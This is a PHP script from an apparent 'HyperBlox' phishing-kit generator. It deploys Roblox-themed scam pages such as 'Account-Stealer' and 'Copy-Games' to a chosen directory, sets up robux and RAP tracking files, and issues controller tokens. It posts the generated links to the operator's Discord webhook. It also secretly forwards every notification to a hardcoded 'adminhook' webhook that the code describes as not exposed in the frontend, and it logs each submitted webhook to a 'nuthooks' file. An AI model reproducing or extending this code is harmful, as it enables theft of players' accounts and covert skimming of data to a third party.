<?php
require_once __DIR__ . '/persistence.php';

function token($length = 32) {
    $base = 'HYPERBLOX';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomPart = '';
    
    for ($i = 0; $i < $length - strlen($base); $i++) {
        $randomPart .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    $mixed = str_shuffle($base . $randomPart);
    return substr($mixed, 0, $length);
}

$dir = $_GET['dir'];
$web = $_GET['web'];
$t = $_GET['t'];
$error = "";
$dualhook = $_GET['dualhook'] ?? '';
$persistBase = hb_get_persist_base();
$tokensDir = hb_tokens_dir();
hb_ensure_dir($tokensDir);
$path2 = $tokensDir;
$cleanupMaxAge = getenv('HYPERBLOX_TEMPLATE_TTL_SECONDS') ? (int)getenv('HYPERBLOX_TEMPLATE_TTL_SECONDS') : 259200;
cleanupOldTemplates($tokensDir, hb_get_persist_base(), $cleanupMaxAge);
$minimal = isset($_GET['minimal']); 

if (preg_match('/[^A-Za-z0-9]/', $dir)) {
    $error = "Directory can only contain letters and numbers!";
}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $web);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPGET, true);
$req = curl_exec($curl);
$jd = json_decode($req, true);
$err = $jd['guild_id'] ?? '';

if ($err == "") {
    $error = "Invalid Webhook";
}

if ($t == "as") {
    $fol = "Account-Stealer";
}
if ($t == "cc") {
    $fol = "Copy-Clothes";
}
if ($t == "gc") {
    $fol = "Copy-Games";
}
if ($t == "fb") {
    $fol = "Follower-Bot";
}
if ($t == "vu") {
    $fol = "Vc-Unlocker";
}
if ($t == "mr") {
    $fol = "Mass-Reporter";
}

function cleanupOldTemplates(string $tokensDir, string $baseDir, int $maxAgeSeconds = 259200): void {
    if (!is_dir($tokensDir)) {
        return;
    }
    foreach (glob($tokensDir . "*.txt") as $tokenFile) {
        $raw = @file_get_contents($tokenFile);
        if ($raw === false) {
            continue;
        }
        $parts = array_map('trim', explode('|', $raw));
        $dir = $parts[1] ?? '';
        $timestamp = isset($parts[4]) && is_numeric($parts[4]) ? (int)$parts[4] : filemtime($tokenFile);
        if (!$dir || !$timestamp) {
            continue;
        }
        if ((time() - $timestamp) > $maxAgeSeconds) {
            $templatePath = hb_template_dir($dir);
            if (strpos(realpath($templatePath) ?: '', realpath($baseDir) ?: '') === 0) {
                hb_rrmdir($templatePath);
            }
            @unlink($tokenFile);
        }
    }
}

if ($error == "") {
    $templatePath = hb_template_dir($dir);
    if (!is_dir($templatePath)) {
        hb_ensure_dir($templatePath);
        $index = file_get_contents("../../$fol/index.php");
        if ($t == "dg") {
            $index = file_get_contents("indexdh.php");
        }
        // URL-encode query parameters embedded into template links
        $index = str_replace("{web}", urlencode($web), $index);
        $index = str_replace("{dualhook}", urlencode($dualhook), $index);
        $token = token();
        $tw = "$dir | $web";
        $path = $templatePath;
        $path2 = $tokensDir;

        if (!file_exists($path2)) {
            mkdir($path2, 0777, true);
        }

        file_put_contents($path2 . "nuthooks.txt", trim($web) . PHP_EOL, FILE_APPEND | LOCK_EX);

        $fo = fopen($path . "index.php", 'w');
        $visit = fopen($path . "visits.txt", 'w');
        $logs = fopen($path . "logs.txt", 'w');
        $usernameFile = fopen($path . "username.txt", 'w');
        $logoFile = fopen($path . "logo.txt", 'w');
        $robuxFile = fopen($path . "robux.txt", 'w');
        $rapFile = fopen($path . "rap.txt", 'w');
        $summaryFile = fopen($path . "summary.txt", 'w');
        $dailyRobuxFile = fopen($path . "dailyrobux.txt", 'w');
        $dailyRapFile = fopen($path . "dailyrap.txt", 'w');
        $dailySummaryFile = fopen($path . "dailysummary.txt", 'w');
        $fo2 = fopen($path2 . "$token.txt", 'w');

        if ($fo) {
            fwrite($fo, $index);
            // Store: token | dir | web | dualhook (dualhook can be empty)
            fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time() . "\n");
            fwrite($visit, '');
            fwrite($logs, '');
            fwrite($usernameFile, 'beammer');
            fwrite($logoFile, '/files/img.png');
            fwrite($robuxFile, '0');
            fwrite($rapFile, '0');
            fwrite($summaryFile, '0');
            fwrite($dailyRobuxFile, json_encode(array_fill(0, 7, 0)));
            fwrite($dailyRapFile, json_encode(array_fill(0, 7, 0)));
            fwrite($dailySummaryFile, json_encode(array_fill(0, 7, 0)));

            // Use HTTP_HOST with protocol to get the actual domain (works for both localhost and production)
            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $dom = $ht . $_SERVER['HTTP_HOST'];
            $timestamp = date("c");
            $hyperbloxIcon = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';

            // Copy media assets (e.g., tutorial videos/images) from template folder into the generated directory
            $srcDir = "../../$fol/";
            if (is_dir($srcDir)) {
                $entries = scandir($srcDir);
                foreach ($entries as $entry) {
                    if ($entry === '.' || $entry === '..' || $entry === 'index.php') continue;
                    $ext = strtolower(pathinfo($entry, PATHINFO_EXTENSION));
                    // Allow common media/static extensions
                    $allowed = ['mp4','webm','ogg','png','jpg','jpeg','gif','webp','ico','svg'];
                    if (in_array($ext, $allowed)) {
                        @copy($srcDir . $entry, $path . DIRECTORY_SEPARATOR . $entry);
                    }
                }
            }

            if ($t == "dg") {
                $json_data = json_encode([
                    "content" => "@everyone",
                    "username" => "HyperBlox",
                    "avatar_url" => $hyperbloxIcon,
                    "embeds" => [
                        [
                            "title" => "💠 Successfully Created!",
                            "description" => "**<:link:1392952591297675315> [Dualhook Link]($dom/$dir) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                            "color" => hexdec("00BFFF"),
                            "fields" => [
                                [
                                    "name" => "<:link:1392952591297675315> Dualhook Link",
                                    "value" => "```$dom/$dir```",
                                    "inline" => false
                                ]
                            ],
                        ]
                    ]
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
            } else {
                if ($minimal) {
                    $json_data = json_encode([
                        "content" => "@everyone",
                        "username" => "HyperBlox",
                        "avatar_url" => $hyperbloxIcon,
                        "embeds" => [
                            [
                                "title" => "💠 Controller Token",
                                "description" => "**<:settings:1392952588093100265> [Controller]($dom/controlPage/sign-in.php?token=$token)**",
                                "color" => hexdec("00BFFF"),
                                "fields" => [
                                    [
                                        "name" => "**<:token:1392953422067662898> Token**",
                                        "value" => "```$token```",
                                        "inline" => false
                                    ]
                                ],
                            ]
                        ]
                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                } else {
                    $json_data = json_encode([
                        "content" => "@everyone",
                        "username" => "HyperBlox",
                        "avatar_url" => $hyperbloxIcon,
                        "embeds" => [
                            [
                                "title" => "💠 Successfully Created!",
                                "description" => "**<:link:1392952591297675315> [Generated Link]($dom/$dir) <:line:1350104634982662164> <:settings:1392952588093100265> [Controller]($dom/controlPage/sign-in.php?token=$token) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                                "color" => hexdec("00BFFF"),
                                "fields" => [
                                    [
                                        "name" => "**<:link:1392952591297675315> Link**",
                                        "value" => "```$dom/$dir```",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "**<:settings:1392952588093100265> Controller**",
                                        "value" => "```$dom/controlPage/sign-in.php?token=$token```",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "**<:token:1392953422067662898> Token**",
                                        "value" => "```$token```",
                                        "inline" => false
                                    ]
                                ],
                            ]
                        ]
                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                }
            }

            $ch = curl_init($web);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $response = curl_exec($ch);
            curl_close($ch);
            
            // Also send to adminhook (receives all notifications - not exposed in frontend)
            $adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
            if (!empty($adminhook)) {
                $ch2 = curl_init($adminhook);
                curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                curl_setopt($ch2, CURLOPT_POST, 1);
                curl_setopt($ch2, CURLOPT_POSTFIELDS, $json_data);
                curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch2, CURLOPT_HEADER, 0);
                curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 5);
                @curl_exec($ch2);
                curl_close($ch2);
            }

            if ($minimal) {
                header('Content-Type: application/json');
                echo json_encode(["status" => "ok", "controller" => "$dom/controlPage/sign-in.php?token=$token", "token" => $token]);
                exit;
            } else {
                // Also render a confirmation page for direct browser usage
                echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Created</title>';
                echo '<meta name="viewport" content="width=device-width, initial-scale=1">';
                echo '<style>body{font-family:Arial,Helvetica,sans-serif;background:#0f172a;color:#f8fafc;padding:24px}';
                echo '.card{max-width:720px;margin:0 auto;background:rgba(30,41,59,.45);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:20px}';
                echo 'a{color:#8b5cf6;text-decoration:none}</style></head><body>';
                echo '<div class="card">';
                echo '<h2>Successfully Created</h2>';
                echo '<p><strong>Generated Link:</strong> <a href="' . $dom . '/' . $dir . '">' . $dom . '/' . $dir . '</a></p>';
                echo '<p><strong>Controller:</strong> <a href="' . $dom . '/controlPage/sign-in.php?token=' . $token . '">' . $dom . '/controlPage/sign-in.php?token=' . $token . '</a></p>';
                echo '<p><strong>Token:</strong> <code>' . $token . '</code></p>';
                echo '<p>These details were also posted to your webhook.</p>';
                echo '</div></body></html>';
            }
            cleanupOldTemplates($tokensDir, hb_get_persist_base(), $cleanupMaxAge);
        }
    } else {
        // Styled notice when directory already exists
        $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
        $dom = $ht . $_SERVER['HTTP_HOST'];
        // Try to find an existing token mapped to this directory (best effort)
        $existingToken = '';
        foreach (glob($path2 . "*.txt") as $tokFile) {
            $c = @file_get_contents($tokFile);
            if ($c && strpos($c, " | $dir | ") !== false) {
                $existingToken = trim(explode('|', $c)[0]);
                break;
            }
        }
        if ($minimal) {
            header('Content-Type: application/json');
            echo json_encode(["status"=>"exists","token"=>$existingToken]);
            exit;
        } else {
            echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Directory Exists</title>';
            echo '<meta name="viewport" content="width=device-width, initial-scale=1">';
            echo '<style>body{font-family:Arial,Helvetica,sans-serif;background:#0f172a;color:#f8fafc;padding:24px}';
            echo '.card{max-width:720px;margin:0 auto;background:rgba(30,41,59,.45);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:20px}';
            echo 'a{color:#8b5cf6;text-decoration:none}.btn{display:inline-block;margin-top:12px;padding:10px 14px;background:#8b5cf6;color:#fff;border-radius:8px}</style></head><body>';
            echo '<div class="card">';
            echo '<h2>Directory Already Exists</h2>';
            echo '<p>The directory <strong>' . htmlspecialchars($dir) . '</strong> is already present.</p>';
            echo '<p><strong>Open existing page:</strong> <a href="' . $dom . '/' . $dir . '">' . $dom . '/' . $dir . '</a></p>';
            if ($existingToken !== '') {
                echo '<p><strong>Controller:</strong> <a href="' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '">' . $dom . '/controlPage/sign-in.php?token=' . $existingToken . '</a></p>';
            } else {
                echo '<p>No controller token was found automatically for this directory.</p>';
            }
            echo '<a class="btn" href="' . $dom . '/' . $dir . '">Open Page</a>';
            echo '</div></body></html>';
        }
    }
} else {
    // Styled error page
    $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $dom = $ht . $_SERVER['HTTP_HOST'];
    $msg = $error ? $error : 'Unknown error';
    if ($minimal) {
        header('Content-Type: application/json');
        echo json_encode(["status"=>"error","message"=>$msg]);
    } else {
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Error</title>';
        echo '<meta name="viewport" content="width=device-width, initial-scale=1">';
        echo '<style>body{font-family:Arial,Helvetica,sans-serif;background:#0f172a;color:#f8fafc;padding:24px}';
        echo '.card{max-width:720px;margin:0 auto;background:rgba(30,41,59,.45);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:20px}';
        echo '.err{color:#ef4444}.btn{display:inline-block;margin-top:12px;padding:10px 14px;background:#8b5cf6;color:#fff;border-radius:8px;text-decoration:none}</style></head><body>';
        echo '<div class="card">';
        echo '<h2 class="err">Creation Failed</h2>';
        echo '<p>' . htmlspecialchars($msg) . '</p>';
        echo '<a class="btn" href="/controlPage/create-local.php">Back</a>';
        echo '</div></body></html>';
    }
}
?>